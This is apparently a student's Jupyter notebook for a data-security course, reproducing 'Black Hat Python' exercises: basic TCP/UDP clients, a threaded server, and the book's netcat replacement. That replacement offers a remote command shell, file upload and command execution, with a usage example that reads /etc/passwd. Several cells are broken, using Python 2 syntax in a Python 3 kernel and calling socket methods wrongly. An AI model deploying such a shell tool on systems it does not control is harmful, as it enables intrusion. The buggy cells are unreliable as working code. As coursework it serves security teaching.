{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "potential-laugh",
   "metadata": {},
   "source": [
    "# <h1> Black Hat Python </h1>\n",
    "\n",
    "## <h2>Data Security</h2>\n",
    "    \n",
    "\n",
    "### <span style=\"color:blue\"> **Diana Aimeé Gutiérrez May /  160300115**</span>\n",
    "<p>Febrero 26, 2021</p>"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "weird-reform",
   "metadata": {},
   "source": [
    "## <span style=\"color:blue\"> **Código: #1**</span>"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "id": "conservative-bench",
   "metadata": {},
   "outputs": [],
   "source": [
    "def sum(number_one, number_two):\n",
    "    number_one_int = convert_integer(number_one)\n",
    "    number_two_int = convert_integer(number_two)\n",
    "    \n",
    "    result = number_one_int + number_two_int\n",
    "    \n",
    "    return result\n",
    "\n",
    "\n",
    "def convert_integer(number_string):\n",
    "    \n",
    "    convert_integer = int(number_string)\n",
    "    print(\"Se ha convertido\", f\"{type(number_string)}\" \"   a->   \" f\"{type(convert_integer)}\")\n",
    "    \n",
    "    return convert_integer"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "id": "measured-inspiration",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Se ha convertido <class 'str'>   a->   <class 'int'>\n",
      "Se ha convertido <class 'str'>   a->   <class 'int'>\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "3"
      ]
     },
     "execution_count": 9,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "p1_answer = sum(\"1\",\"2\")\n",
    "p1_answer"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "id": "lesser-automation",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Se ha convertido <class 'str'>   a->   <class 'int'>\n",
      "Se ha convertido <class 'str'>   a->   <class 'int'>\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "3992"
      ]
     },
     "execution_count": 10,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "p2_answer = sum(\"1998\", \"1994\")\n",
    "p2_answer"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "descending-disabled",
   "metadata": {},
   "source": [
    "## <span style=\"color:blue\"> **Código TCP CLIENT: #2**</span>"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "id": "rental-universal",
   "metadata": {},
   "outputs": [],
   "source": [
    "import socket"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "id": "informational-purchase",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "b'HTTP/1.1 301 Moved Permanently\\r\\nLocation: http://www.google.com/\\r\\nContent-Type: text/html; charset=UTF-8\\r\\nDate: Sat, 27 Feb 2021 02:05:49 GMT\\r\\nExpires: Mon, 29 Mar 2021 02:05:49 GMT\\r\\nCache-Control: public, max-age=2592000\\r\\nServer: gws\\r\\nContent-Length: 219\\r\\nX-XSS-Protection: 0\\r\\nX-Frame-Options: SAMEORIGIN\\r\\n\\r\\n<HTML><HEAD><meta http-equiv=\"content-type\" content=\"text/html;charset=utf-8\">\\n<TITLE>301 Moved</TITLE></HEAD><BODY>\\n<H1>301 Moved</H1>\\nThe document has moved\\n<A HREF=\"http://www.google.com/\">here</A>.\\r\\n</BODY></HTML>\\r\\n'\n"
     ]
    }
   ],
   "source": [
    "target_host = \"www.google.com\"\n",
    "target_port = 80\n",
    "\n",
    "client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n",
    "\n",
    "client.connect((target_host, target_port))\n",
    "\n",
    "data_client = \"GET / HTTP/1.1\\r\\nHost: google.com\\r\\n\\r\\n\"\n",
    "client.send(data_client.encode('utf-8'))\n",
    "\n",
    "response = client.recv(4096)\n",
    "print(response)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "individual-fabric",
   "metadata": {},
   "source": [
    "## <span style=\"color:blue\"> **Código UDP CLIENT: #3**</span>"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "id": "mounted-machinery",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "b'Aimee'\n",
      "('127.0.0.1', 80)\n"
     ]
    }
   ],
   "source": [
    "target_host = \"127.0.0.1\"\n",
    "target_port = 80\n",
    "\n",
    "client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n",
    "client.bind((target_host, target_port))\n",
    "\n",
    "data = \"Aimee\"\n",
    "client.sendto(data.encode('utf-8'), (target_host, target_port))\n",
    "\n",
    "data, addr = client.recvfrom(4096)\n",
    "\n",
    "print(data)\n",
    "print(addr)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "approved-performer",
   "metadata": {},
   "source": [
    "## <span style=\"color:blue\"> **Código TCP Server: #4**</span>"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "id": "close-recording",
   "metadata": {},
   "outputs": [],
   "source": [
    "import threading"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "removed-accounting",
   "metadata": {},
   "outputs": [],
   "source": [
    "bind_ip = \"127.0.0.1\"\n",
    "bind_port = 9999\n",
    "\n",
    "tcp_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n",
    "\n",
    "tcp_server.bind((bind_ip, bind_port))\n",
    "\n",
    "tcp_server.listen(5)\n",
    "\n",
    "\n",
    "\n",
    "def handle_client(client_socket):\n",
    "    \n",
    "    # send something\n",
    "    client_socket.send(\"Connected\\r\\n\")\n",
    "    \n",
    "    data = socket.recv(4096)    \n",
    "    print (\"[*] Reveived: %s\", {data})\n",
    "    \n",
    "    # send back a packet\n",
    "    client_socket.send(b\"ACK\")\n",
    "    \n",
    "    client_socket.close()\n",
    "    \n",
    "while True:\n",
    "    client_socket, addr = tcp_server.accept()\n",
    "    \n",
    "    print (\"[*] Accepted connection from: %s:%d\" % (addr[0], addr[1]))\n",
    "    \n",
    "    # spin up our client thread to handle incoming data\n",
    "    client_handler = threading.Thread(target=handle_client,args=(client_socket,))\n",
    "    client_handler.start()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "creative-brush",
   "metadata": {},
   "source": [
    "## <span style=\"color:blue\"> **Código TCP Server: #**</span>"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "loaded-fishing",
   "metadata": {},
   "outputs": [],
   "source": [
    "import sys\n",
    "import socket\n",
    "import getopt\n",
    "import threading\n",
    "import subprocess"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "corrected-classic",
   "metadata": {},
   "outputs": [],
   "source": [
    "# define some global variables\n",
    "listen             = False\n",
    "command            = False\n",
    "upload             = False\n",
    "execute            = \"\"\n",
    "target             = \"\"\n",
    "upload_destination = \"\"\n",
    "port               = 0\n",
    "\n",
    "# this runs a command and returns the output\n",
    "def run_command(command):\n",
    "        \n",
    "        # trim the newline\n",
    "        command = command.rstrip()\n",
    "        \n",
    "        # run the command and get the output back\n",
    "        try:\n",
    "                output = subprocess.check_output(command,stderr=subprocess.STDOUT, shell=True)\n",
    "        except:\n",
    "                output = \"Failed to execute command.\\r\\n\"\n",
    "        \n",
    "        # send the output back to the client\n",
    "        return output\n",
    "\n",
    "# this handles incoming client connections\n",
    "def client_handler(client_socket):\n",
    "        global upload\n",
    "        global execute\n",
    "        global command\n",
    "        \n",
    "        # check for upload\n",
    "        if len(upload_destination):\n",
    "                \n",
    "                # read in all of the bytes and write to our destination\n",
    "                file_buffer = \"\"\n",
    "                \n",
    "                # keep reading data until none is available\n",
    "                while True:\n",
    "                        data = client_socket.recv(1024)\n",
    "                        \n",
    "                        if not data:\n",
    "                                break\n",
    "                        else:\n",
    "                                file_buffer += data\n",
    "                                \n",
    "                # now we take these bytes and try to write them out\n",
    "                try:\n",
    "                        file_descriptor = open(upload_destination,\"wb\")\n",
    "                        file_descriptor.write(file_buffer)\n",
    "                        file_descriptor.close()\n",
    "                        \n",
    "                        # acknowledge that we wrote the file out\n",
    "                        client_socket.send(\"Successfully saved file to %s\\r\\n\" % upload_destination)\n",
    "                except:\n",
    "                        client_socket.send(\"Failed to save file to %s\\r\\n\" % upload_destination)\n",
    "                        \n",
    "                \n",
    "        \n",
    "        # check for command execution\n",
    "        if len(execute):\n",
    "                \n",
    "                # run the command\n",
    "                output = run_command(execute)\n",
    "                \n",
    "                client_socket.send(output)\n",
    "        \n",
    "        \n",
    "        # now we go into another loop if a command shell was requested\n",
    "        if command:\n",
    "                \n",
    "                while True:\n",
    "                        # show a simple prompt\n",
    "                        client_socket.send(\"<BHP:#> \")\n",
    "                        \n",
    "                        # now we receive until we see a linefeed (enter key)\n",
    "                        cmd_buffer = \"\"\n",
    "                        while \"\\n\" not in cmd_buffer:\n",
    "                                cmd_buffer += client_socket.recv(1024)\n",
    "                \n",
    "                        \n",
    "                        # we have a valid command so execute it and send back the results\n",
    "                        response = run_command(cmd_buffer)\n",
    "                        \n",
    "                        # send back the response\n",
    "                        client_socket.send(response)\n",
    "        \n",
    "# this is for incoming connections\n",
    "def server_loop():\n",
    "        global target\n",
    "        global port\n",
    "        \n",
    "        # if no target is defined we listen on all interfaces\n",
    "        if not len(target):\n",
    "                target = \"0.0.0.0\"\n",
    "                \n",
    "        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n",
    "        server.bind((target,port))\n",
    "        \n",
    "        server.listen(5)        \n",
    "        \n",
    "        while True:\n",
    "                client_socket, addr = server.accept()\n",
    "                \n",
    "                # spin off a thread to handle our new client\n",
    "                client_thread = threading.Thread(target=client_handler,args=(client_socket,))\n",
    "                client_thread.start()\n",
    "                \n",
    "\n",
    "# if we don't listen we are a client....make it so.\n",
    "def client_sender(buffer):\n",
    "        \n",
    "        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n",
    "                \n",
    "        try:\n",
    "                # connect to our target host\n",
    "                client.connect((target,port))\n",
    "                \n",
    "                # if we detect input from stdin send it \n",
    "                # if not we are going to wait for the user to punch some in\n",
    "                \n",
    "                if len(buffer):\n",
    "                        \n",
    "                        client.send(buffer)\n",
    "                \n",
    "                while True:\n",
    "                        \n",
    "                        # now wait for data back\n",
    "                        recv_len = 1\n",
    "                        response = \"\"\n",
    "                        \n",
    "                        while recv_len:\n",
    "                                data     = client.recv(4096)\n",
    "                                recv_len = len(data)\n",
    "                                response+= data\n",
    "                                \n",
    "                                if recv_len < 4096:\n",
    "                                        break\n",
    "                        \n",
    "                        print response, \n",
    "                        \n",
    "                        # wait for more input\n",
    "                        buffer = raw_input(\"\")\n",
    "                        buffer += \"\\n\"                        \n",
    "                        \n",
    "                        # send it off\n",
    "                        client.send(buffer)\n",
    "                        \n",
    "                \n",
    "        except:\n",
    "                # just catch generic errors - you can do your homework to beef this up\n",
    "                print \"[*] Exception! Exiting.\"\n",
    "                \n",
    "                # teardown the connection                  \n",
    "                client.close()  \n",
    "                        \n",
    "                        \n",
    "        \n",
    "\n",
    "def usage():\n",
    "        print \"Netcat Replacement\"\n",
    "        print\n",
    "        print \"Usage: bhpnet.py -t target_host -p port\"\n",
    "        print \"-l --listen                - listen on [host]:[port] for incoming connections\"\n",
    "        print \"-e --execute=file_to_run   - execute the given file upon receiving a connection\"\n",
    "        print \"-c --command               - initialize a command shell\"\n",
    "        print \"-u --upload=destination    - upon receiving connection upload a file and write to [destination]\"\n",
    "        print\n",
    "        print\n",
    "        print \"Examples: \"\n",
    "        print \"bhpnet.py -t 192.168.0.1 -p 5555 -l -c\"\n",
    "        print \"bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\\\target.exe\"\n",
    "        print \"bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\\\"cat /etc/passwd\\\"\"\n",
    "        print \"echo 'ABCDEFGHI' | ./bhpnet.py -t 192.168.11.12 -p 135\"\n",
    "        sys.exit(0)\n",
    "\n",
    "\n",
    "def main():\n",
    "        global listen\n",
    "        global port\n",
    "        global execute\n",
    "        global command\n",
    "        global upload_destination\n",
    "        global target\n",
    "        \n",
    "        if not len(sys.argv[1:]):\n",
    "                usage()\n",
    "                \n",
    "        # read the commandline options\n",
    "        try:\n",
    "                opts, args = getopt.getopt(sys.argv[1:],\"hle:t:p:cu:\",[\"help\",\"listen\",\"execute\",\"target\",\"port\",\"command\",\"upload\"])\n",
    "        except getopt.GetoptError as err:\n",
    "                print str(err)\n",
    "                usage()\n",
    "                \n",
    "                \n",
    "        for o,a in opts:\n",
    "                if o in (\"-h\",\"--help\"):\n",
    "                        usage()\n",
    "                elif o in (\"-l\",\"--listen\"):\n",
    "                        listen = True\n",
    "                elif o in (\"-e\", \"--execute\"):\n",
    "                        execute = a\n",
    "                elif o in (\"-c\", \"--commandshell\"):\n",
    "                        command = True\n",
    "                elif o in (\"-u\", \"--upload\"):\n",
    "                        upload_destination = a\n",
    "                elif o in (\"-t\", \"--target\"):\n",
    "                        target = a\n",
    "                elif o in (\"-p\", \"--port\"):\n",
    "                        port = int(a)\n",
    "                else:\n",
    "                        assert False,\"Unhandled Option\"\n",
    "        \n",
    "\n",
    "        # are we going to listen or just send data from stdin\n",
    "        if not listen and len(target) and port > 0:\n",
    "                \n",
    "                # read in the buffer from the commandline\n",
    "                # this will block, so send CTRL-D if not sending input\n",
    "                # to stdin\n",
    "                buffer = sys.stdin.read()\n",
    "                \n",
    "                # send data off\n",
    "                client_sender(buffer)   \n",
    "        \n",
    "        # we are going to listen and potentially \n",
    "        # upload things, execute commands and drop a shell back\n",
    "        # depending on our command line options above\n",
    "        if listen:\n",
    "                server_loop()\n",
    "\n",
    "main()  "
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.8"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
